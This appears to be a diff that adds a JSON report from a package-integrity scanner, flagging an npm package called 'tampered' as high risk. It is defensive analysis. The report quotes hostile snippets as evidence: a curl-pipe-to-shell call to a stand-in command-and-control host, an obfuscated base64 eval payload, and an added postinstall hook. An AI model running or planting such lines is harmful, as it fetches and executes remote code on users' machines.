@@ -1,0 +1,398 @@
+{
+  "schema_version": "1.0",
+  "package": {
+    "ecosystem": "npm",
+    "name": "tampered",
+    "version": "unknown",
+    "repo": "",
+    "commit": "",
+    "source_resolution": "local"
+  },
+  "summary": {
+    "verdict": "HIGH",
+    "score": 365,
+    "headline": "High risk: Execution or dynamic code evaluation: const cp = require('child_process');",
+    "counts": {
+      "identical": 1,
+      "modified": 2,
+      "added": 4,
+      "missing": 2,
+      "explained": 3,
+      "suspicious": 3
+    }
+  },
+  "provenance": {
+    "attestation_present": false,
+    "repo_match": null,
+    "commit_match": null,
+    "notes": [
+      "Local file analysis"
+    ]
+  },
+  "capabilities": {
+    "source": {},
+    "package": {
+      "EXEC": [
+        "const cp = require('child_process');",
+        "cp.exec('curl https://c2-collector.threat-actor.example/toke"
+      ],
+      "NETWORK": [
+        "c2-collector.threat-actor.example"
+      ],
+      "EVAL": [
+        "var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybC"
+      ],
+      "OBFUSCATION": [
+        "High entropy / hex obfuscated line"
+      ]
+    },
+    "gained": [
+      {
+        "category": "EXEC",
+        "detail": "const cp = require('child_process');",
+        "file": "dist/index.js",
+        "line": 12
+      },
+      {
+        "category": "NETWORK",
+        "detail": "c2-collector.threat-actor.example",
+        "file": "dist/index.js",
+        "line": 13
+      },
+      {
+        "category": "EXEC",
+        "detail": "cp.exec('curl https://c2-collector.threat-actor.example/toke",
+        "file": "dist/index.js",
+        "line": 13
+      },
+      {
+        "category": "EVAL",
+        "detail": "var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybC",
+        "file": "lib/x.min.js",
+        "line": 1
+      },
+      {
+        "category": "OBFUSCATION",
+        "detail": "High entropy / hex obfuscated line",
+        "file": "lib/x.min.js",
+        "line": 1
+      }
+    ]
+  },
+  "files": [
+    {
+      "path": "LICENSE",
+      "bucket": "identical",
+      "status": "normal",
+      "explained_by": "none",
+      "reason": "",
+      "findings": [],
+      "source_hash": "be673375fcf9ca4b9ccb1d4260b0cbb7b692bc9c0c32bf6fdffd74093c9ceb58",
+      "package_hash": "be673375fcf9ca4b9ccb1d4260b0cbb7b692bc9c0c32bf6fdffd74093c9ceb58"
+    },
+    {
+      "path": "README.md",
+      "bucket": "modified",
+      "status": "explained",
+      "explained_by": "config",
+      "reason": "Standard distribution metadata file; All sensitive tokens and external strings are contained in source repository",
+      "findings": [],
+      "source_hash": "56b2c7afcd4b1aaf3c4ee8da04df9e9e1a0228343b707b038aa3baa7df69df85",
+      "package_hash": "9888e47761e7c5a31620e7432a821c185d06bbfb6de8bfd0151e1470b23f1242"
+    },
+    {
+      "path": "dist/index.js",
+      "bucket": "added",
+      "status": "suspicious",
+      "explained_by": "none",
+      "reason": "",
+      "findings": [
+        {
+          "id": "exec_or_eval_gained",
+          "severity": "high",
+          "rule": "behavior",
+          "line": 12,
+          "snippet": "const cp = require('child_process');",
+          "reason": "Execution or dynamic code evaluation: const cp = require('child_process');",
+          "weight": 25
+        },
+        {
+          "id": "network_domain_gained",
+          "severity": "high",
+          "rule": "behavior",
+          "line": 13,
+          "snippet": "c2-collector.threat-actor.example",
+          "reason": "Network connection to novel domain: 'c2-collector.threat-actor.example'",
+          "weight": 25
+        },
+        {
+          "id": "exec_or_eval_gained",
+          "severity": "high",
+          "rule": "behavior",
+          "line": 13,
+          "snippet": "cp.exec('curl https://c2-collector.threat-actor.example/toke",
+          "reason": "Execution or dynamic code evaluation: cp.exec('curl https://c2-collector.threat-actor.example/toke",
+          "weight": 25
+        },
+        {
+          "id": "exec_or_eval_gained",
+          "severity": "high",
+          "rule": "behavior",
+          "line": 12,
+          "snippet": "const cp = require('child_process');",
+          "reason": "Command or child process execution invocation",
+          "weight": 25
+        },
+        {
+          "id": "exec_or_eval_gained",
+          "severity": "high",
+          "rule": "behavior",
+          "line": 13,
+          "snippet": "cp.exec('curl https://c2-collector.threat-actor.example/token | sh');",
+          "reason": "Command or child process execution invocation",
+          "weight": 25
+        },
+        {
+          "id": "network_domain_gained",
+          "severity": "high",
+          "rule": "behavior",
+          "line": 13,
+          "snippet": "cp.exec('curl https://c2-collector.threat-actor.example/token | sh');",
+          "reason": "Network communication with novel domain not found in source: 'c2-collector.threat-actor.example'",
+          "weight": 25
+        },
+        {
+          "id": "string_not_in_source",
+          "severity": "medium",
+          "rule": "containment",
+          "line": 12,
+          "snippet": "child_process",
+          "reason": "Novel sensitive token 'child_process' not found in source repository",
+          "weight": 20
+        }
+      ],
+      "source_hash": "",
+      "package_hash": "ebedca789699dc381f2808c690504b93bac9abbaa8fa0658b90a1e89793304d4"
+    },
+    {
+      "path": "dist/index.js.map",
+      "bucket": "added",
+      "status": "explained",
+      "explained_by": "config",
+      "reason": "Located within declared build output directory 'dist'; All sensitive tokens and external strings are contained in source repository",
+      "findings": [],
+      "source_hash": "",
+      "package_hash": "f953247074d7cf4fa9338ef5c8ea14b9ff77a9286ceb2212777ea948245a5d34"
+    },
+    {
+      "path": "lib/setup.js",
+      "bucket": "added",
+      "status": "explained",
+      "explained_by": "containment",
+      "reason": "All sensitive tokens and external strings are contained in source repository",
+      "findings": [],
+      "source_hash": "",
+      "package_hash": "1c3f6ceb821ad966d7edba4b463b24616687c564db23425e38601acdaef9923e"
+    },
+    {
+      "path": "lib/x.min.js",
+      "bucket": "added",
+      "status": "suspicious",
+      "explained_by": "none",
+      "reason": "",
+      "findings": [
+        {
+          "id": "exec_or_eval_gained",
+          "severity": "high",
+          "rule": "behavior",
+          "line": 1,
+          "snippet": "var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybC",
+          "reason": "Execution or dynamic code evaluation: var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybC",
+          "weight": 25
+        },
+        {
+          "id": "obfuscated",
+          "severity": "high",
+          "rule": "obfuscation",
+          "line": 1,
+          "snippet": "High entropy / hex obfuscated line",
+          "reason": "Obfuscated structure or packed encoding: High entropy / hex obfuscated line",
+          "weight": 30
+        },
+        {
+          "id": "char_code_chain",
+          "severity": "high",
+          "rule": "obfuscation",
+          "line": 1,
+          "snippet": "var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybCBldmlsLmNvbQ==','base64').toString();eva",
+          "reason": "Concealed string construction via String.fromCharCode chain",
+          "weight": 30
+        },
+        {
+          "id": "base64_decode_payload",
+          "severity": "medium",
+          "rule": "obfuscation",
+          "line": 1,
+          "snippet": "var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybCBldmlsLmNvbQ==','base64').toString();eva",
+          "reason": "Base64 payload buffer decoding detected",
+          "weight": 20
+        },
+        {
+          "id": "eval_gained",
+          "severity": "high",
+          "rule": "behavior",
+          "line": 1,
+          "snippet": "var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybCBldmlsLmNvbQ==','base64').toString();eva",
+          "reason": "Dynamic code evaluation (eval / Function constructor)",
+          "weight": 25
+        },
+        {
+          "id": "string_not_in_source",
+          "severity": "medium",
+          "rule": "containment",
+          "line": 1,
+          "snippet": "eval",
+          "reason": "Novel sensitive token 'eval' not found in source repository",
+          "weight": 20
+        }
+      ],
+      "source_hash": "",
+      "package_hash": "96f4da292bf24eeefcf6ad0293ec848ffd140a608e01114f8ca1cd82e6dd4dbd"
+    },
+    {
+      "path": "package.json",
+      "bucket": "modified",
+      "status": "suspicious",
+      "explained_by": "none",
+      "reason": "",
+      "findings": [
+        {
+          "id": "install_hook_added",
+          "severity": "high",
+          "rule": "install_hooks",
+          "line": 1,
+          "snippet": "\"postinstall\": \"node lib/setup.js\"",
+          "reason": "Dangerous install lifecycle script 'postinstall' was added in published package.json but does not exist in source repository",
+          "weight": 40
+        }
+      ],
+      "source_hash": "a99342cc4ac7b15814ceb2d77f8898eee79db0db4513907d93eeee23648feea5",
+      "package_hash": "888cb90a034edabe2f0a25806550ba56e6ae1dd3b56fbb007b8d54c45e8a7b15"
+    },
+    {
+      "path": "src/index.ts",
+      "bucket": "missing",
+      "status": "normal",
+      "explained_by": "none",
+      "reason": "Omitted from package (typical for tests and documentation)",
+      "findings": [],
+      "source_hash": "cce07c86fec201d3dca15467dfda0c1023db110a46678abf4c3e5387e44243d8",
+      "package_hash": ""
+    },
+    {
+      "path": "tsconfig.json",
+      "bucket": "missing",
+      "status": "normal",
+      "explained_by": "none",
+      "reason": "Omitted from package (typical for tests and documentation)",
+      "findings": [],
+      "source_hash": "2de83e88aa8930db9454e3efddd5ee47d2272d593c78fab9b7d6f9a787073bba",
+      "package_hash": ""
+    }
+  ],
+  "ai": {
+    "model": "",
+    "used": false,
+    "explanations": [
+      {
+        "file": "dist/index.js",
+        "text": "Deterministic analysis flagged: Execution or dynamic code evaluation: const cp = require('child_process');; Network connection to novel domain: 'c2-collector.threat-actor.example'; Execution or dynamic code evaluation: cp.exec('curl https://c2-collector.threat-actor.example/toke; Command or child process execution invocation; Command or child process execution invocation; Network communication with novel domain not found in source: 'c2-collector.threat-actor.example'; Novel sensitive token 'child_process' not found in source repository",
+        "quotes": [
+          {
+            "text": "const cp = require('child_process');",
+            "line": 12,
+            "verified": true
+          },
+          {
+            "text": "c2-collector.threat-actor.example",
+            "line": 13,
+            "verified": true
+          },
+          {
+            "text": "cp.exec('curl https://c2-collector.threat-actor.example/toke",
+            "line": 13,
+            "verified": true
+          },
+          {
+            "text": "const cp = require('child_process');",
+            "line": 12,
+            "verified": true
+          },
+          {
+            "text": "cp.exec('curl https://c2-collector.threat-actor.example/token | sh');",
+            "line": 13,
+            "verified": true
+          },
+          {
+            "text": "cp.exec('curl https://c2-collector.threat-actor.example/token | sh');",
+            "line": 13,
+            "verified": true
+          },
+          {
+            "text": "child_process",
+            "line": 12,
+            "verified": true
+          }
+        ]
+      },
+      {
+        "file": "lib/x.min.js",
+        "text": "Deterministic analysis flagged: Execution or dynamic code evaluation: var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybC; Obfuscated structure or packed encoding: High entropy / hex obfuscated line; Concealed string construction via String.fromCharCode chain; Base64 payload buffer decoding detected; Dynamic code evaluation (eval / Function constructor); Novel sensitive token 'eval' not found in source repository",
+        "quotes": [
+          {
+            "text": "var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybC",
+            "line": 1,
+            "verified": true
+          },
+          {
+            "text": "High entropy / hex obfuscated line",
+            "line": 1,
+            "verified": true
+          },
+          {
+            "text": "var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybCBldmlsLmNvbQ==','base64').toString();eva",
+            "line": 1,
+            "verified": true
+          },
+          {
+            "text": "var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybCBldmlsLmNvbQ==','base64').toString();eva",
+            "line": 1,
+            "verified": true
+          },
+          {
+            "text": "var _0x1a2b=['\\x73\\x79\\x73'];var _0x3c4d=Buffer.from('Y3VybCBldmlsLmNvbQ==','base64').toString();eva",
+            "line": 1,
+            "verified": true
+          },
+          {
+            "text": "eval",
+            "line": 1,
+            "verified": true
+          }
+        ]
+      },
+      {
+        "file": "package.json",
+        "text": "Deterministic analysis flagged: Dangerous install lifecycle script 'postinstall' was added in published package.json but does not exist in source repository",
+        "quotes": [
+          {
+            "text": "\"postinstall\": \"node lib/setup.js\"",
+            "line": 1,
+            "verified": true
+          }
+        ]
+      }
+    ]
+  },
+  "generated_at": "2026-10-31T17:57:58.055298+00:00"
+}
